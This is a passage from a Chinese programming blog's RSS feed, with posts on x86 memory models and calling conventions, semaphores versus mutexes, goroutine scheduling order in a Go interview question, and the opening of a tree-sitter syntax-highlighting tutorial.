&lt;p>保护模式下可以用&lt;strong>逻辑地址&lt;/strong>访问主存，逻辑地址又称&lt;strong>远指针&lt;/strong>（&lt;code>far ptr&lt;/code>），逻辑地址由段选择器加上偏移寻址组成。运行于 IA-32 体系的程序，段选择器最多可以选择 2^14^-1 个段，每个段可以长达 2^32^ 字节。&lt;/p>
&lt;h3 id="nearfarhuge-指针">near/far/huge 指针&lt;/h3>
&lt;p>near 指针是给定段内用16比特表示的偏移值，最大访问地址空间64KB。&lt;/p>
&lt;p>far 指针是32比特表示的偏移值，在16位架构下可以访问段外的内存，32/64位架构下则依然是段内。&lt;/p>
&lt;p>huge指针和far指针大小相同，大体目标就是在16位限制下访问更大的地址空间。&lt;/p>
&lt;h3 id="平坦内存模型线性内存模型">平坦内存模型/线性内存模型&lt;/h3>
&lt;p>参考：&lt;a class="link" href="https://en.wikipedia.org/wiki/Flat_memory_model" target="_blank" rel="noopener"
>flat memory model - wiki&lt;/a>&lt;/p>
&lt;p>平坦内存模型也叫线性内存模型，定义是程序中的内存在同一个连续的地址空间中，不需要通过分段或分页机制间接取址。（从操作系统或硬件角度来说，可能依然有分页或分段，但对用户程序来说无感知）。&lt;/p>
&lt;h3 id="intel-内存模型">Intel 内存模型&lt;/h3>
&lt;p>下述内存模型是实模式下的，保护模式下更近似于线性模型。&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>模型&lt;/th>
&lt;th>数据段指针&lt;/th>
&lt;th>代码段指针&lt;/th>
&lt;th>定义&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>Tiny&lt;/td>
&lt;td>near&lt;/td>
&lt;td>near&lt;/td>
&lt;td>CS=DS=SS&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Small&lt;/td>
&lt;td>near&lt;/td>
&lt;td>near&lt;/td>
&lt;td>DS=SS&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Medium&lt;/td>
&lt;td>near&lt;/td>
&lt;td>far&lt;/td>
&lt;td>DS=SS，多个代码段&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Compact&lt;/td>
&lt;td>far&lt;/td>
&lt;td>near&lt;/td>
&lt;td>一个代码段，多个数据段&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Large&lt;/td>
&lt;td>far&lt;/td>
&lt;td>far&lt;/td>
&lt;td>多个代码段和数据段&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Huge&lt;/td>
&lt;td>huge&lt;/td>
&lt;td>far&lt;/td>
&lt;td>多个代码段和数据段，单个数组可能超过64KB&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;ul>
&lt;li>在Tiny模型下，所有段寄存器指针指向相同的段。&lt;/li>
&lt;li>在所有DS=SS的模型里，数据段指针总是near。&lt;/li>
&lt;li>栈总是限制在最高64KB。&lt;/li>
&lt;/ul>
&lt;h2 id="函数">函数&lt;/h2>
&lt;h3 id="栈">栈&lt;/h3>
&lt;p>参考：&lt;a class="link" href="https://www.zhihu.com/question/36103513" target="_blank" rel="noopener"
>栈的增长方向？ - 知乎&lt;/a>&lt;/p>
&lt;p>讨论对象是 Windows x86 32位程序。栈从高位向低位增长，需要注意看栈视图的地址是高地址在上还是低地址在上，被调用方的栈帧总是在调用方的增长方向上。&lt;/p>
&lt;p>例如下面的汇编指令。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-asm" data-lang="asm">&lt;span class="nf">push&lt;/span> &lt;span class="no">eax&lt;/span> &lt;span class="c">; 把eax当参数入栈 esp=75f888
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="no">push&lt;/span> &lt;span class="no">eax&lt;/span> &lt;span class="c">; 把eax当参数入栈 esp=75f884
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="no">push&lt;/span> &lt;span class="no">eax&lt;/span> &lt;span class="c">; 把eax当参数入栈 esp=75f880
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="no">call&lt;/span> &lt;span class="no">example.fn&lt;/span> &lt;span class="c">; 调用
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="no">add&lt;/span> &lt;span class="no">esp&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">0xc&lt;/span> &lt;span class="c">; 调用方清栈，cdecl调用约定
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>执行call指令，跳转到被调用函数时，栈上会压入函数的返回地址。&lt;/p>
&lt;h3 id="栈指针-frame-pointer">栈指针 frame pointer&lt;/h3>
&lt;p>栈指针可以通过编译参数 &lt;code>-fomit-frame-pointer&lt;/code> 或 &lt;code>/Oy-&lt;/code> 来关闭。&lt;/p>
&lt;p>在有栈指针（frame pointer）的情况下，每个函数开头会做一个&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-asm" data-lang="asm">&lt;span class="nf">push&lt;/span> &lt;span class="no">ebp&lt;/span>
&lt;span class="nf">mov&lt;/span> &lt;span class="no">ebp&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="no">esp&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>的动作，这个动作做完后，新栈帧的栈底就是 ebp 了，ebp正好指向旧栈帧基地址，在ebp下（和栈增长方向相反）就是函数返回地址和调用方给的实参。&lt;/p>
&lt;p>在函数返回前，又会做一个&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-asm" data-lang="asm">&lt;span class="nf">pop&lt;/span> &lt;span class="no">ebp&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>来完成平栈。&lt;/p>
&lt;p>下面就是被调函数执行完函数开头的指令后的栈。&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>地址（栈向下增长）&lt;/th>
&lt;th>内容含义&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>&lt;code>[ebp+0x10]&lt;/code>&lt;/td>
&lt;td>第3个参数&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>[ebp+0xc]&lt;/code>&lt;/td>
&lt;td>第2个参数&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>[ebp+0x8]&lt;/code>&lt;/td>
&lt;td>第1个参数&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>[ebp+0x4]&lt;/code>&lt;/td>
&lt;td>函数的返回地址&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>[ebp]&lt;/code>&lt;/td>
&lt;td>上一个栈帧基地址，此时&lt;code>esp&lt;/code>和&lt;code>ebp&lt;/code>相同。&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>关闭栈指针的情况下，函数不会在开头保存ebp了，对函数参数的引用也会改为相对esp的偏移。&lt;/p>
&lt;h3 id="调用约定">调用约定&lt;/h3>
&lt;p>先讨论 cdecl 调用约定，函数调用的一般过程是：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-asm" data-lang="asm">&lt;span class="nf">push&lt;/span> &lt;span class="mi">0x0&lt;/span> &lt;span class="c">; 压栈参数 0
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="no">push&lt;/span> &lt;span class="no">example.50be50&lt;/span> &lt;span class="c">; 压栈参数 &amp;#34;%d&amp;#34;
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="no">call&lt;/span> &lt;span class="no">example._printf&lt;/span> &lt;span class="c">; 调用 printf(&amp;#34;%d&amp;#34;, 0)
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="no">add&lt;/span> &lt;span class="no">esp&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">0x8&lt;/span> &lt;span class="c">; cdecl 约定下，调用者清栈
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>stdcall&lt;/code>调用约定和&lt;code>cdecl&lt;/code>调用约定的区别在于&lt;code>stdcall&lt;/code>是被调用方清栈：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-asm" data-lang="asm">&lt;span class="nf">ret&lt;/span> &lt;span class="mi">0x8&lt;/span> &lt;span class="c">; ret 有一个的可选参数，指示要从栈上弹出多少空间。相当于是先 add esp,0x8 再 ret
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>cdecl&lt;/code>是大部分编译器包括微软VC++默认的调用约定，&lt;code>stdcall&lt;/code>是所有 Windows API 的调用约定。&lt;/p>
&lt;h3 id="name-mangling">name mangling&lt;/h3>
&lt;p>好像没有广泛使用的译名，可以叫名字修饰、名字重整或改编，意会吧。&lt;/p>
&lt;p>对于有使用c/c++编程经验的人可能已经见过很多链接错误：&lt;/p>
&lt;ul>
&lt;li>undefined reference to &amp;hellip;&lt;/li>
&lt;li>无法解析的外部符号 &amp;hellip;&lt;/li>
&lt;/ul>
&lt;p>如果注意过提示中的符号名应该会发现这些符号名称都不是代码里写的函数名称，而是经过了变形的。&lt;/p>
&lt;p>&lt;code>cdecl&lt;/code>调用约定下，name mangling 的规则是在符号前加下划线。比如C库的&lt;code>printf&lt;/code>函数，经过name mangling后是&lt;code>_printf&lt;/code>。&lt;/p>
&lt;p>&lt;code>stdcall&lt;/code>调用约定下，name mangling 的规则是在符号前加下划线，符号后加 &lt;em>@参数长度&lt;/em>。需要注意的是对于C中的变长参数 variadic function，是不能用 &lt;code>stdcall&lt;/code> 调用约定的。&lt;/p>
&lt;p>用函数 &lt;code>int fn(int a, int b)&lt;/code> 举例，认为 int 是 4 字节长，此时&lt;code>cdecl&lt;/code>下叫&lt;code>_fn&lt;/code>，&lt;code>stdcall&lt;/code>下叫&lt;code>_fn@8&lt;/code>。&lt;/p></description></item><item><title>信号量 vs 互斥锁</title><link>https://nnnewb.github.io/blog/p/%E4%BF%A1%E5%8F%B7%E9%87%8F-vs-%E4%BA%92%E6%96%A5%E9%94%81/</link><pubDate>Thu, 26 Aug 2021 00:00:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/%E4%BF%A1%E5%8F%B7%E9%87%8F-vs-%E4%BA%92%E6%96%A5%E9%94%81/</guid><description>&lt;p>看 &lt;a class="link" href="https://github.com/tmrts/go-patterns/blob/master/synchronization/semaphore.md" target="_blank" rel="noopener"
>go-patterns/semaphore.md at master · tmrts/go-patterns (github.com)&lt;/a> 时产生了疑问，信号量为啥长得和互斥锁没啥区别呢。于是就谷歌了一圈，重温下一些关于并发的知识，对比信号量 &lt;em>semaphore&lt;/em> 和互斥锁 &lt;em>mutex&lt;/em> 。&lt;/p>
&lt;h2 id="互斥锁-mutex">互斥锁 mutex&lt;/h2>
&lt;p>以 &lt;em>pthread&lt;/em> 自带的互斥锁为例，提供了三种不同类型的互斥锁：&lt;/p>
&lt;ul>
&lt;li>&lt;em>PTHREAD_MUTEX_NORMAL&lt;/em> ，普通的互斥锁，不支持死锁检测（&lt;em>does not detect deadlock&lt;/em>），不支持递归加锁（&lt;em>relock without first unlocking it&lt;/em> 会导致死锁），不检测解锁线程，解锁一个未加锁的互斥锁是未定义行为（&lt;em>undefined behavior&lt;/em>）。&lt;/li>
&lt;li>&lt;em>PTHREAD_MUTEX_ERRORCHECK&lt;/em>，带错误检查的互斥锁，不支持递归加锁（会返回错误），解锁其他线程的互斥锁会返回错误，解锁未加锁的互斥锁会返回错误。&lt;/li>
&lt;li>&lt;em>PTHREAD_MUTEX_RECURSIVE&lt;/em>，递归加锁（&lt;em>relock with out unlocking it&lt;/em>）会成功，解锁时需要调用解锁的次数和加锁时调用加锁的次数相同。解锁其他线程的互斥锁会返回错误。解锁未加锁的互斥锁会返回错误。&lt;/li>
&lt;li>&lt;em>PTHREAD_MUTEX_DEFAULT&lt;/em>，默认互斥锁类型，对这一类型的互斥锁递归加锁时行为是未定义的，解锁未加锁的互斥锁行为是未定义的，解锁其他线程的互斥锁行为是未定义的。这一类型的互斥锁通常映射为另外几种互斥锁之一。&lt;/li>
&lt;/ul>
&lt;p>可以比较清楚地看出，互斥锁有三个基本特征：&lt;/p>
&lt;ul>
&lt;li>是否可重复加锁&lt;/li>
&lt;li>是否可解锁未加锁的互斥锁&lt;/li>
&lt;li>是否可解锁被其他人加锁的互斥锁&lt;/li>
&lt;/ul>
&lt;p>最严格的 &lt;em>PTHREAD_MUTEX_ERRORCHECK&lt;/em> 类型互斥锁，对此定义是 NO、NO、NO 。&lt;/p>
&lt;p>互斥锁的基本使用方式和使用场景有点像厕所的坑位：&lt;/p>
&lt;ol>
&lt;li>抢坑位，锁门&lt;/li>
&lt;li>你懂的&lt;/li>
&lt;li>解锁，出门&lt;/li>
&lt;/ol>
&lt;p>其中有隐含的信息包括：&lt;/p>
&lt;ol>
&lt;li>坑位是提前选择好的，你只能抢一个坑位，不能抢多个坑位。&lt;/li>
&lt;li>坑位在使用期间是独占的，你不能和别人分享一个坑位。&lt;/li>
&lt;li>只有你自己能解锁坑位，谁也不想办事儿的时候有人闯进来吧？&lt;/li>
&lt;/ol>
&lt;p>而递归加锁这一特殊场景，我寻思吧，有点难拿坑位比喻。反正也不重要，就别管了。&lt;/p>
&lt;h2 id="信号量-semaphore">信号量 semaphore&lt;/h2>
&lt;p>信号量本质上是一个整型值，不细分什么类型了。还是用 &lt;em>pthread&lt;/em> 举例吧，依据 &lt;em>POSIX&lt;/em> 标准。&lt;/p>
&lt;p>对信号量的操作可以先简单分5种。&lt;/p>
&lt;ul>
&lt;li>&lt;code>sem_init(sem,pshared,value)&lt;/code>，初始化一个信号量，可以指定要不要在 &lt;code>fork()&lt;/code> 创建的进程间共享，还可以指定信号量初始值。&lt;/li>
&lt;li>&lt;code>sem_wait(sem)&lt;/code>，等待信号量，信号量等于0时阻塞，其他线程通过&lt;code>sem_post&lt;/code>唤醒。&lt;/li>
&lt;li>&lt;code>sem_post(sem)&lt;/code>，发送信号量，唤醒阻塞在&lt;code>sem_wait&lt;/code>的线程。&lt;/li>
&lt;li>&lt;code>sem_getvalue(sem,valp)&lt;/code>，获取信号量当前值。&lt;/li>
&lt;li>&lt;code>sem_destroy(sem)&lt;/code>，销毁信号量。&lt;/li>
&lt;/ul>
&lt;p>信号量的主要特征就是它的值：&lt;/p>
&lt;ul>
&lt;li>当值等于0时，&lt;code>sem_wait&lt;/code> 会阻塞。&lt;/li>
&lt;li>当值大于0时，&lt;code>sem_wait&lt;/code> 返回并使值-1。&lt;/li>
&lt;/ul>
&lt;p>可以注意到，信号量的确可以做到互斥锁能做到的事情：设定好初始值1，然后&lt;code>sem_wait&lt;/code>等同于加锁，&lt;code>sem_post&lt;/code>等同于解锁，的确模拟出了互斥锁的功能。&lt;/p>
&lt;p>不过信号量去模拟互斥锁会有一些问题。比如说无法实现递归加锁（信号量值等于0时，&lt;code>sem_wait&lt;/code>会阻塞），无法检测解锁线程是不是加锁线程（除非你自己再封装一次，把信号量和线程ID绑定），解锁未加锁会导致信号量值大于1，进而造成&lt;code>sem_wait&lt;/code>会允许多个线程并行执行（还是一样，你得自己封装，在&lt;code>sem_post&lt;/code>前检查当前信号量的值）。&lt;/p>
&lt;p>好，模拟互斥锁的话题到此为止。回到屎尿屁的比喻上。互斥锁可以比作公厕收费的老大爷。&lt;/p>
&lt;ul>
&lt;li>老规矩，不排队，大家从老大爷手里抢坑位。&lt;/li>
&lt;li>坑位满员的时候老大爷谁也不让进。&lt;/li>
&lt;li>每出来一个人，老大爷就放进去一个人。&lt;/li>
&lt;/ul>
&lt;p>其中隐含的信息包括：&lt;/p>
&lt;ul>
&lt;li>当然，可用的坑位或者说资源依然是有限的，数量不确定。&lt;/li>
&lt;li>你只能独占一部分资源，而且每个人独占的资源都一样多。不然老大爷看到有一个坑位放你进去了，但你想要用两个坑位，那你就只能继续等着，或者和别人分享坑位了。&lt;/li>
&lt;/ul>
&lt;p>信号量最好用的场景还是 &lt;strong>生产者-消费者&lt;/strong> 模型的队列，来统计队列中元素数量。消费者可以用一个简单的 &lt;code>sem_timedwait&lt;/code> 调用实现等待新元素加入队列，用互斥锁来确保队列操作是线程安全的。&lt;/p>
&lt;p>可见管公厕的老大爷也是非常有生活智慧哈，充分利用了年轻时的编程经验来提高晚年生活质量。&lt;/p>
&lt;h2 id="结论">结论&lt;/h2>
&lt;p>互斥锁和信号量都能处理数据竞争，但各有侧重。&lt;/p>
&lt;p>典型的数据竞争场景当然是互斥锁好用，但信号量也不是完全不行。&lt;/p>
&lt;p>信号量的典型场景也一样，互斥锁即便能行也会显得别扭。&lt;/p></description></item><item><title>面试题之 goroutine 运行顺序</title><link>https://nnnewb.github.io/blog/p/%E9%9D%A2%E8%AF%95%E9%A2%98%E4%B9%8B-goroutine-%E8%BF%90%E8%A1%8C%E9%A1%BA%E5%BA%8F/</link><pubDate>Wed, 04 Aug 2021 10:37:24 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/%E9%9D%A2%E8%AF%95%E9%A2%98%E4%B9%8B-goroutine-%E8%BF%90%E8%A1%8C%E9%A1%BA%E5%BA%8F/</guid><description>&lt;p>不是我做的沙雕面试题，在 segmentfault 上看到的。&lt;/p>
&lt;!-- more -->
&lt;h2 id="原题">原题&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="kn">package&lt;/span> &lt;span class="nx">main&lt;/span>
&lt;span class="kn">import&lt;/span> &lt;span class="p">(&lt;/span>
&lt;span class="s">&amp;#34;fmt&amp;#34;&lt;/span>
&lt;span class="s">&amp;#34;runtime&amp;#34;&lt;/span>
&lt;span class="s">&amp;#34;sync&amp;#34;&lt;/span>
&lt;span class="p">)&lt;/span>
&lt;span class="kd">func&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">runtime&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">GOMAXPROCS&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">wg&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">sync&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">WaitGroup&lt;/span>&lt;span class="p">{}&lt;/span>
&lt;span class="nx">wg&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Add&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="nx">i&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nx">i&lt;/span> &lt;span class="p">&amp;lt;&lt;/span> &lt;span class="mi">5&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nx">i&lt;/span>&lt;span class="o">++&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">go&lt;/span> &lt;span class="kd">func&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Println&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;A:&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">i&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">wg&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Done&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="p">}()&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="nx">i&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nx">i&lt;/span> &lt;span class="p">&amp;lt;&lt;/span> &lt;span class="mi">5&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nx">i&lt;/span>&lt;span class="o">++&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">go&lt;/span> &lt;span class="kd">func&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">num&lt;/span> &lt;span class="kt">int&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Println&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;B:&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">num&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">wg&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Done&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="p">}(&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">wg&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Wait&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>问：代码输出结果是什么？&lt;/p>
&lt;h2 id="胡乱分析">胡乱分析&lt;/h2>
&lt;p>第一眼进去看到 &lt;code>runtime.GOMAXPROCS(1)&lt;/code> ，初步怀疑是又在考什么 GMP 面试题了。&lt;/p>
&lt;p>但凡说到 Go 面试好像就一定要考一下 goroutine 调度和 GMP 模型，招进来又只让你写 curd 。搞得面试跟考试背书一样。&lt;/p>
&lt;p>先不吐槽，继续看。跳过两行 &lt;code>sync.WaitGroup&lt;/code> 之后就是一个经典 for 循环陷阱。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="k">for&lt;/span> &lt;span class="nx">i&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nx">i&lt;/span> &lt;span class="p">&amp;lt;&lt;/span> &lt;span class="mi">5&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nx">i&lt;/span>&lt;span class="o">++&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">go&lt;/span> &lt;span class="kd">func&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Println&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;A:&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">i&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">wg&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Done&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="p">}()&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>就是个典型的闭包捕获问题，&lt;code>i&lt;/code> 被以引用形式捕获进匿名函数，循环中的 &lt;code>i++&lt;/code> 会导致所有匿名函数捕获的 &lt;code>i&lt;/code> 的值都跟着变。&lt;/p>
&lt;p>但有所区别的是，这个匿名函数被当 goroutine 执行了。之后再细说。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="k">for&lt;/span> &lt;span class="nx">i&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nx">i&lt;/span> &lt;span class="p">&amp;lt;&lt;/span> &lt;span class="mi">5&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nx">i&lt;/span>&lt;span class="o">++&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">go&lt;/span> &lt;span class="kd">func&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">num&lt;/span> &lt;span class="kt">int&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Println&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;B:&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">num&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">wg&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Done&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="p">}(&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>这就是上面错误例子的正确写法，把闭包捕获变成了参数传递，将 &lt;code>i&lt;/code> 复制了一份进匿名函数。&lt;/p>
&lt;p>好了，那么根据上面的分析，最终结果是&amp;hellip;？&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-text" data-lang="text">A: 5
A: 5
A: 5
A: 5
A: 5
B: 0
B: 1
B: 2
B: 3
B: 4
&lt;/code>&lt;/pre>&lt;/div>&lt;p>是这样吗？&lt;/p>
&lt;h2 id="再次胡乱分析">再次胡乱分析&lt;/h2>
&lt;p>遗憾的是实际跑起来结果是&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-text" data-lang="text">B: 4
A: 5
A: 5
A: 5
A: 5
A: 5
B: 0
B: 1
B: 2
B: 3
&lt;/code>&lt;/pre>&lt;/div>&lt;p>可以看到最后一个启动的 goroutine 的输出跑到了最开头。其他顺序倒是没啥变化。为啥呢？&lt;/p>
&lt;p>先看 &lt;code>runtime.GOMAXPROCS(1)&lt;/code> 。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/goroutines-schedule-order/G-M-P.png"
loading="lazy"
alt="GMP"
>&lt;/p>
&lt;p>从 GMP 模型可以得知这一句代码实际限制了所有 goroutine 只能被顺序串行执行（所有 g 都只能在这唯一一个 p 的本地队列里等待 m）。&lt;/p>
&lt;p>而 &lt;code>main()&lt;/code> 函数里创建 goroutine 的顺序是明确的，5 个 A，5 个 B。&lt;/p>
&lt;p>按照一般理解的话，队列是先进先出 FIFO 的结构，一个 p 又限制了其他 m 即使唤醒了，抢占了 p，也不能做 work stealing（也用不着做），那么 goroutine 的执行顺序自然只能是先进先出了。&lt;/p>
&lt;p>那么这个程序的行为就很奇怪了，先创建的 goroutine 先执行的话，那么输出顺序应该和我们预料的一样。实际运行结果为什么会变成这样呢？&lt;/p>
&lt;h2 id="不卖关子了">不卖关子了&lt;/h2>
&lt;p>直接说结论嗷。&lt;/p>
&lt;p>&lt;strong>不知道。&lt;/strong>&lt;/p>
&lt;p>别笑，真的不知道。特地上&lt;a class="link" href="https://stackoverflow.com/questions/35153010/goroutines-always-execute-last-in-first-out" target="_blank" rel="noopener"
>爆栈搜了下&lt;/a>，得到的结论就是，不知道。&lt;/p>
&lt;blockquote>
&lt;p>In Go 1.5, the order in which goroutines are scheduled has been changed. &lt;strong>The properties of the scheduler were never defined by the language&lt;/strong>, but programs that depend on the scheduling order may be broken by this change. We have seen a few (erroneous) programs affected by this change. If you have programs that implicitly depend on the scheduling order, you will need to update them.&lt;/p>
&lt;/blockquote>
&lt;p>从一个 Go 语言使用者的角度来说，goroutine 调度器的实现细节（像是多个 goroutine 之间的运行顺序）并不是能依赖的东西。&lt;/p>
&lt;p>如果写过一段时间的 C/C++ ，那么面试官应该很清楚，C/C++ 有几样臭名昭著的东西： &lt;em>Undefined Behavior&lt;/em>, &lt;em>Unspecified Behavior&lt;/em>。而 goroutine 执行顺序就是一个 Go 中的 &lt;em>Undefined Behavior&lt;/em>。&lt;/p>
&lt;h2 id="结论">结论&lt;/h2>
&lt;p>我理解中的拿来主义，既不能被动地等待，也不能不加分辨地拿来，而既然加以分辨了，自然更不应该将拿来的事物当成解决一切问题的万能药。&lt;/p>
&lt;p>Go 虽然是一门不错的语言，试图将语言细节尽可能明确定义来避免再次陷入 C/C++的陷阱，但显然 Go 用户不这么想。至少，有部分 Go 用户不这么想，他们想搞清楚 Go 的一切，然后把这一切都当作至高无上的准则，来鞭挞其余人。&lt;/p>
&lt;p>目前为止，GMP 很好，作为面试题也说得过去。&lt;/p>
&lt;p>到底我只是厌恶这世上的一部分人罢了。&lt;/p></description></item><item><title>用 tree-sitter 写一个代码高亮</title><link>https://nnnewb.github.io/blog/p/%E7%94%A8-tree-sitter-%E5%86%99%E4%B8%80%E4%B8%AA%E4%BB%A3%E7%A0%81%E9%AB%98%E4%BA%AE/</link><pubDate>Tue, 03 Aug 2021 15:52:21 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/%E7%94%A8-tree-sitter-%E5%86%99%E4%B8%80%E4%B8%AA%E4%BB%A3%E7%A0%81%E9%AB%98%E4%BA%AE/</guid><description>&lt;p>这次用 tree-sitter 写一个简单的代码高亮。&lt;/p>
&lt;!-- more -->
&lt;h2 id="前言">前言&lt;/h2>
&lt;p>我寻思代码高亮是什么应该没啥可解释的，也有叫“语法高亮”，总之都是一个意思。就是给编辑器里的代码涂上颜色，便于阅读。&lt;/p>
&lt;p>一般来说，简单的代码高亮只需要正则表达式就能搞定（比如说关键字高亮，Camel Case 标识符高亮等），不过正则表达式来实现高亮还是有很大的局限性。&lt;/p>
&lt;p>举例来说，当我把函数当参数传给另一个函数的时候——&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-javascript" data-lang="javascript">&lt;span class="kd">function&lt;/span> &lt;span class="nx">f&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{}&lt;/span>
